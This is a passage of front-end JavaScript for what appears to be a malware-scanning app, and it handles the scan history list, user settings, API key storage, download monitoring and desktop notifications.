    node.textContent = Math.round(target * (1 - Math.pow(1 - p, 4)));
    if (p < 1) requestAnimationFrame(step);
  };
  requestAnimationFrame(step);
}
function restartAnim(node) { node.style.animation = "none"; void node.offsetWidth; node.style.animation = ""; }

/* ===================================================================
 * History
 * =================================================================== */
const TRASH = '<svg viewBox="0 0 24 24" aria-hidden="true"><path d="M4 7h16M10 11v6M14 11v6M6 7l1 13h10l1-13M9 7V4h6v3"/></svg>';

function formatWhen(iso, full) {
  const d = new Date(iso);
  if (Number.isNaN(d.getTime())) return "";
  return new Intl.DateTimeFormat(lang, full ? { dateStyle: "medium", timeStyle: "short" } : { hour: "2-digit", minute: "2-digit" }).format(d);
}
function groupOf(iso) {
  const d = new Date(iso);
  const today = new Date(); today.setHours(0, 0, 0, 0);
  const days = Math.floor((today - new Date(d.getFullYear(), d.getMonth(), d.getDate())) / 86400000);
  if (days <= 0) return "today";
  if (days === 1) return "yesterday";
  if (days < 7) return "week";
  return "earlier";
}

async function loadHistory() {
  if (state.history) { renderHistory(true); return; }
  const list = $("history-list");
  list.replaceChildren(...Array.from({ length: 5 }, () => el("div", "skeleton")));
  try { state.history = await api("/api/history"); renderHistory(true); }
  catch { list.replaceChildren(el("p", "empty-state", t("network"))); }
}

function renderHistory(animate) {
  const list = $("history-list");
  const query = $("history-search").value.trim().toLowerCase();
  const all = state.history || [];
  const range = ($("history-date") || {}).value || "all";
  // a custom range: from the start of "from" to the end of "to" (either may be empty)
  const custom = range === "custom";
  if ($("history-range")) $("history-range").hidden = !custom;
  const dayStart = (v) => { const d = new Date(`${v}T00:00:00`); return Number.isNaN(d.getTime()) ? null : d.getTime(); };
  const from = custom && $("history-from") && $("history-from").value ? dayStart($("history-from").value) : null;
  const to = custom && $("history-to") && $("history-to").value ? dayStart($("history-to").value) : null;
  const since = range === "all" || custom ? 0 : Date.now() - Number(range) * 86400000;
  const type = ($("history-type") || {}).value || "all";
  const rows = all.filter((r) => {
    const ts = new Date(r.timestamp).getTime();
    return (state.filter === "all" || (state.filter === "quarantined" ? r.quarantined : r.classification === state.filter || (state.filter === "SUSPICIOUS" && r.classification === "KNOWN_MALWARE"))) &&
      (!query || r.target.toLowerCase().includes(query) || verdictWords(r.classification).join(" ").toLowerCase().includes(query)) &&
      (!since || ts >= since) && (from == null || ts >= from) && (to == null || ts < to + 86400000) &&
      (type === "all" || historyType(r.target) === type);
  });
  const sort = ($("history-sort") || {}).value || "new";
  if (sort === "old") rows.reverse();
  else if (sort === "risk") rows.sort((a, b) => (b.score - a.score) || (new Date(b.timestamp) - new Date(a.timestamp)));
  $("history-count").textContent = all.length ? t("count")(all.length) : "";
  if (animate && window.CSInsights) CSInsights.render(all);
  const dist = $("dist");
  dist.replaceChildren();
  ["KNOWN_MALWARE", "SUSPICIOUS", "REVIEW", "NO_INDICATORS_OBSERVED"].forEach((k, i) => {
    const n = all.filter((r) => r.classification === k).length;
    if (!n) return;
    const seg = el("i");
    seg.style.flex = String(n);
    seg.style.background = `var(${RISK_COLOR[k]})`;
    seg.style.animationDelay = `${i * 0.15}s`;
    seg.title = `${t("verdicts")[k][0]}: ${n}`;
    dist.append(seg);
  });
  // FLIP: remember where each row was, so a filter or search glides rows into place
  const before = new Map();
  if (!animate) list.querySelectorAll(".row").forEach((n) => before.set(n.dataset.id, n.getBoundingClientRect().top));
  list.replaceChildren();
  if (!rows.length) { list.append(el("p", "empty-state", all.length ? t("noMatch") : t("emptyHistory"))); return; }
  let lastGroup = null;
  rows.forEach((r, i) => {
    const g = groupOf(r.timestamp);
    if (sortNew() && g !== lastGroup) { lastGroup = g; list.append(el("div", "group-label", t("groups")[g])); }
    list.append(historyRow(r, animate ? Math.min(i, 14) * 0.035 : 0));
  });
  if (!animate && before.size && !matchMedia("(prefers-reduced-motion: reduce)").matches) {
    list.querySelectorAll(".row").forEach((n) => {
      const was = before.get(n.dataset.id);
      n.style.opacity = "1";
      n.style.animation = "none";
      if (was === undefined) { n.animate([{ opacity: 0, transform: "scale(.96)" }, { opacity: 1, transform: "none" }], { duration: 380, easing: "cubic-bezier(.22,1,.36,1)" }); return; }
      const dy = was - n.getBoundingClientRect().top;
      if (Math.abs(dy) > 1) n.animate([{ transform: `translateY(${dy}px)` }, { transform: "none" }], { duration: 520, easing: "cubic-bezier(.22,1,.36,1)" });
    });
  }
}

/* what a history row was, from its target: a link, pasted text, or a file by its extension */
const TYPE_EXT = {
  doc: /\.(pdf|docx?|docm|xlsx?|xlsm|pptx?|pptm|rtf|odt|ods|odp|txt|csv|md|eml|msg)$/i,
  program: /\.(exe|dll|scr|com|msi|msix|sys|elf|so|dylib|apk|appx|jar|bin)$/i,
  archive: /\.(zip|rar|7z|gz|tgz|tar|cab|iso|img|crx|xpi)$/i,
  image: /\.(png|jpe?g|gif|bmp|webp|svg|ico|tiff?|heic)$/i,
  script: /\.(ps1|bat|cmd|vbs|js|jse|hta|py|sh|php|html?|wsf|lnk)$/i,
};
function historyType(target) {
  const t = String(target || "");
  if (/^https?:\/\//i.test(t)) return "url";
  if (t === "Pasted text") return "text";
  const name = t.split(/[\\/]/).pop();
  return Object.keys(TYPE_EXT).find((k) => TYPE_EXT[k].test(name)) || "other";
}
const sortNew = () => (($("history-sort") || {}).value || "new") === "new";   // day groups only make sense newest-first
function historyRow(r, delay) {
  const row = el("div", "row");
  row.dataset.id = r.id;
  row.tabIndex = 0;
  row.setAttribute("role", "button");
  row.style.setProperty("--c", `var(${RISK_COLOR[r.classification] || "--muted"})`);
  row.style.setProperty("--d", `${delay}s`);
  const mini = el("div", "mini");
  mini.style.setProperty("--p", Math.max(3, r.score));
  mini.append(el("span", "", String(r.score)));
  const main = el("div", "row-main");
  const name = r.target.split(/[\\/]/).filter(Boolean).pop() || r.target;
  const title = el("strong", "", r.target.startsWith("http") ? r.target : name);
  title.title = r.target;
  main.append(title, el("small", "", formatWhen(r.timestamp, groupOf(r.timestamp) !== "today")));
  const tags = el("div", "row-tags");
  tags.append(el("span", "row-tag", verdictWords(r.classification)[0]));
  if (r.quarantined) tags.append(el("span", "row-tag q", "🔒 " + t("inQuarantine")));
  if (r.report === false) tags.append(el("span", "row-tag gone", t("reportMissing")));
  const del = el("button", "row-del");
  del.type = "button";
  del.setAttribute("aria-label", t("delete"));
  del.innerHTML = TRASH;
  del.addEventListener("click", (e) => { e.stopPropagation(); deleteRecord(r, row, name); });
  row.append(mini, main, tags, del);
  row.addEventListener("click", () => openRecord(r.id));
  row.addEventListener("keydown", (e) => {
    if (e.target !== row) return;
    if (e.key === "Enter" || e.key === " ") { e.preventDefault(); openRecord(r.id); }
    if (e.key === "Delete") deleteRecord(r, row, name);
  });
  return row;
}

async function openRecord(id) {
  try {
    const result = await api(`/api/history/${id}`);
    state.lastResult = result;
    state.keepResult = performance.now() + 1500;
    location.hash = "#/scan";
    renderResult(result, true);
  } catch { toast(t("reportGone")); }
}

async function deleteRecord(record, row, name) {
  if (!(await confirmDialog(t("delTitle"), t("delBody")(name), t("remove")))) { row.focus(); return; }
  try { await api(`/api/history/${record.id}`, { method: "DELETE" }); } catch (err) { toast(err.message); return; }
  state.history = state.history.filter((r) => r.id !== record.id);
  if (window.CSInsights) CSInsights.render(state.history);
  row.classList.add("leaving");
  row.addEventListener("animationend", () => renderHistory(false), { once: true });
  toast(t("removed"));
}

$("history-search").addEventListener("input", () => renderHistory(false));
["history-date", "history-sort", "history-type", "history-from", "history-to"].forEach((id) => { if ($(id)) $(id).addEventListener("change", () => renderHistory(false)); });
const historyChips = [...document.querySelectorAll("#view-history .chip")];
historyChips.forEach((chip) => chip.setAttribute("aria-pressed", String(chip.classList.contains("active"))));
historyChips.forEach((chip) => chip.addEventListener("click", () => {
  state.filter = chip.dataset.filter;
  historyChips.forEach((c) => { c.classList.toggle("active", c === chip); c.setAttribute("aria-pressed", String(c === chip)); });
  renderHistory(false);
}));

/* ===================================================================
 * Settings
 * =================================================================== */
const settingInputs = [...document.querySelectorAll("#view-settings [data-key]")];

async function loadSettings() {
  try {
    state.settings = await api("/api/settings");
    document.body.classList.toggle("public-mode", !!state.settings.public);   // the online version
    renderSettings(); applyPrefs(); watchEvents();
  } catch { /* keep defaults */ }
}

function renderSettings() {
  const s = state.settings;
  if (!s) return;
  const size = settingInputs.find((i) => i.dataset.key === "maximum_file_size");
  if (size) size.max = String(capMB());     // the scanner never reads more than this, whatever the setting says
  settingInputs.forEach((input) => {
    const value = s[input.dataset.key];
    if (input.type === "checkbox") input.checked = !!value;
    else input.value = Math.min(Number(input.max) || Infinity, Math.round(value / (Number(input.dataset.scale) || 1)));
  });
  $("folder-out").textContent = s.monitoring_directory || "";
  updateOutputs();
  renderWatchPill();
}

function updateOutputs() {
  const size = settingInputs.find((i) => i.dataset.key === "maximum_file_size");
  const time = settingInputs.find((i) => i.dataset.key === "analysis_timeout");
  $("size-out").textContent = t("mb")(size.value);
  let cap = size.closest("label").querySelector(".size-cap");
  if (!cap) { cap = el("small", "size-cap"); size.closest("label").querySelector("span").append(cap); }
  cap.textContent = state.settings && state.settings.public ? ax("sizeCapPublic", { n: 4 }) : ax("sizeCap", { n: 50 });
  $("time-out").textContent = t("sec")(time.value);
}

function applyPrefs() {
  const s = state.settings || {};
  document.documentElement.classList.toggle("large", !!s.large_text);
  document.documentElement.classList.toggle("still", s.animated_background === false);
  requestAnimationFrame(() => { moveNavInk(); moveInk(); });
}

let saveTimer = null;
const pending = {};
function setSaveState(cls, text) { const n = $("save-state"); n.className = `save-state ${cls}`; n.textContent = text; }

function queueSetting(key, value, delay = 150) {
  pending[key] = value;
  state.settings = { ...state.settings, ...pending };
  applyPrefs();
  updateOutputs();
  setSaveState("saving", t("saving"));
  clearTimeout(saveTimer);
  saveTimer = setTimeout(saveSettings, delay);
}

settingInputs.forEach((input) => {
  const handler = () => {
    const scale = Number(input.dataset.scale) || 1;
    queueSetting(input.dataset.key, input.type === "checkbox" ? input.checked : Number(input.value) * scale, input.type === "range" ? 450 : 150);
  };
  input.addEventListener(input.type === "range" ? "input" : "change", handler);
});

async function saveSettings() {
  const changes = { ...pending };
  Object.keys(pending).forEach((k) => delete pending[k]);
  try {
    state.settings = await postJSON("/api/settings", changes, "PUT");
    setSaveState("saved", `✓ ${t("saved")}`);
    renderSettings();
    if ("ai_summary_enabled" in changes || "ai_model" in changes) loadAiStatus(true);
    watchEvents();
  } catch (err) {
    setSaveState("error", t("saveFailed") + err.message);
    loadSettings();
  }
}

$("pick-folder").addEventListener("click", async () => {
  try {
    const picked = await postJSON("/api/pick", { kind: "folder" });
    if (picked.path) { $("folder-out").textContent = picked.path; queueSetting("monitoring_directory", picked.path); }
  } catch (err) { toast(err.message); }
});

function renderAiSettings() {
  const ai = state.ai;
  if (!ai) return;
  const select = $("ai-model");
  const current = (state.settings && state.settings.ai_model) || ai.model;
  const models = [...new Set([current, ...(ai.models || [])])];
  select.replaceChildren(...models.map((m) => { const o = el("option", "", m); o.value = m; o.selected = m === current; return o; }));
  const stateLine = $("ai-state");
  stateLine.replaceChildren(el("span", `ai-dot ${ai.state}`), document.createTextNode(t("aiState")[ai.state] || ai.state));
}
$("ai-model").addEventListener("change", (e) => queueSetting("ai_model", e.target.value));

async function loadKeys() {
  try {
    const keys = await api("/api/keys");
    Object.entries(keys).forEach(([k, on]) => { const n = $(`k-${k}`); if (n) { n.textContent = on ? `● ${t("keySaved")}` : t("keyNone"); n.classList.toggle("on", on); } });
  } catch { /* DPAPI unavailable */ }
}
$("keys-save").addEventListener("click", async () => {
  const changes = {};
  document.querySelectorAll("[data-secret]").forEach((f) => { if (f.value.trim()) changes[f.dataset.secret] = f.value.trim(); });
  if (!Object.keys(changes).length) return;
  try {
    await postJSON("/api/keys", changes, "PUT");
    document.querySelectorAll("[data-secret]").forEach((f) => { f.value = ""; });
    toast(t("keysSaved"));
    loadKeys();
  } catch (err) { toast(t("saveFailed") + err.message); }
});

/* downloads watch */
let eventsTimer = null;
function renderWatchPill() {
  const on = state.settings && state.settings.monitor_state === "on";
  $("watch-pill").hidden = !on;
  if (on) $("watch-pill").querySelector("span").textContent = t("watchOn");
}
function watchEvents() {
  clearTimeout(eventsTimer);
  if (!state.settings || state.settings.monitor_state !== "on") return;
  const tick = async () => {
    try {
      const res = await api(`/api/events?since=${state.eventsSince}`);
      res.events.forEach((ev) => {
        state.eventsSince = Math.max(state.eventsSince, ev.id);
        toast(t("downloadSeen")(ev.name), { label: t("scanIt"), run: () => scanPath(ev.path) });
        notify(ev.name, t("downloadSeen")(ev.name), () => scanPath(ev.path));
      });
    } catch { /* server gone */ }
    eventsTimer = setTimeout(tick, 4000);
  };
  api("/api/events?since=0").then((res) => {
    res.events.forEach((ev) => { state.eventsSince = Math.max(state.eventsSince, ev.id); });
    eventsTimer = setTimeout(tick, 4000);
  }).catch(() => {});
}

/* ---------------- boot ---------------- */
/* desktop notifications, only when the window is in the background */
function notificationsOn() {
  try { return localStorage.getItem("cs-notify") === "1" && "Notification" in window && Notification.permission === "granted"; } catch { return false; }
}
function notify(title, body, onClick) {
  if (!notificationsOn() || !document.hidden) return;
  const n = new Notification(`CyberScan · ${String(title).split(/[\\/]/).pop()}`, { body, icon: "icon.svg", tag: "cyberscan" });
  n.onclick = () => { window.focus(); n.close(); if (onClick) onClick(); };
}

function showResult(result) {
  state.lastResult = result;
  state.keepResult = performance.now() + 1500;
  location.hash = "#/scan";
  renderResult(result, true);
}

window.CS = {
  t, api, postJSON, download, toast, confirmDialog, el, $, cells, enterApp, formatBytes, scanPath,
  onLang: (fn) => langListeners.push(fn), get lang() { return lang; },
  get settings() { return state.settings; }, state, openRecord, showResult, notify, notificationsOn,
  newScan, chooseFiles, resetChoice, setMode: (m) => tabs.find((x) => x.dataset.mode === m)?.click(),
  toggleLang: () => openLangMenu(), setLang,
  // one source for what every module shows about a result
  verdictOf, findingsOf, elapsedOf, modeOf, loc, ax, tf, sevWord, stageText, typeLabel, targetLabel, limitsLabel,
  friendlyError, reportText, verdictWords, engineName, scanTime, mitreOf, engineText, checksByEngine, hostOf, limitBytes, capMB, repairedName,
};
document.addEventListener("DOMContentLoaded", () => {
  applyLang();
  if (!I18N[lang]) CS_LANGS.load(lang).then(applyLang).catch(() => { lang = "en"; applyLang(); });
  /* Prefill (browser extension, phone share, links): #/scan?url=<link> or ?url=<link> fills the Link
   * field, #/scan?text=<message> the Text field. Nothing starts by itself: the visitor presses Start. */
  const pre = new URLSearchParams((location.hash.split("?")[1] || "") || location.search.slice(1));
  if (location.hash.includes("?")) history.replaceState(null, "", location.pathname + location.search.replace(/[?&](url|text)=[^&]*/g, "") + "#/scan");
  route();
  if (SCAN_PAGE && (pre.get("url") || pre.get("text"))) {
    const m = pre.get("url") ? "url" : "text";
    tabs.find((x) => x.dataset.mode === m)?.click();
    $(m).value = (pre.get(m) || "").slice(0, m === "url" ? 2048 : 20000);
    updateReady();
  }
  loadSettings();
  loadAiStatus();
});
